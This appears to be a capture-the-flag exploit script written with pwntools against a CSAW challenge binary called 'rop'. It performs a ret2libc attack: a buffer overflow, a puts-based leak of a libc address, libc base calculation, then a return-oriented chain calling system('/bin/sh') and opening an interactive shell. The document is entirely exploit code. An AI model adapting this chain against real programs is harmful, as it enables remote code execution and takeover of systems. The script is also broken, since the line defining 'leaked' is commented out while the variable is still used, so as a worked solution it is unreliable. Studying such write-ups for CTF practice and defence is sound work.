## Original Script

```
from pwn import *

p = process("rop")
#p = remote('pwn.chal.csaw.io', 5016)

libc = ELF("libc.so.6")
#libc = ELF("libc-2.27.so")

elf = ELF("rop")
rop = ROP(elf)

base = b"A"*40
poprdi = 0x400683
ret = 0x40048e

poprdiprog = (rop.find_gadget(['pop rdi', 'ret']))[0]


_libc_start_main_ptr = 0x600ff0
_libc_start_main_ptrprog = elf.symbols['__libc_start_main']

puts = 0x4004a0
putsprog = elf.symbols['puts']
main = elf.symbols["main"]

log.info("rdi:"+hex(poprdi))
log.info("rdi from program:"+hex(poprdiprog))

log.info("_libc_start:"+hex(_libc_start_main_ptr))
log.info("_libc_start from program:"+hex(_libc_start_main_ptrprog))

log.info("puts:"+hex(puts))
log.info("puts from program:"+hex(putsprog))

rop = base + p64(poprdi) + p64(_libc_start_main_ptr) + p64(puts) + p64(main)

p.recvline()
p.sendline(rop)

recieved = p.recvline()
print(recieved)
#leaked = u64(recieved.ljust(8, b"\x00"))

log.info("address of leaked:"+hex(leaked))

libc.address = leaked - libc.sym["__libc_start_main"]
log.info("address of libc:" + hex(libc.address))

#rop = base + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) +  p64(ret)+p64(libc.symbols["system"])
rop = base + p64(poprdi) + p64(next(libc.search(b"/bin/sh"))) + p64(ret) + p64(libc.symbols["system"])

print(p.recvline())
print(rop)
p.sendline(rop)

p.interactive()
```
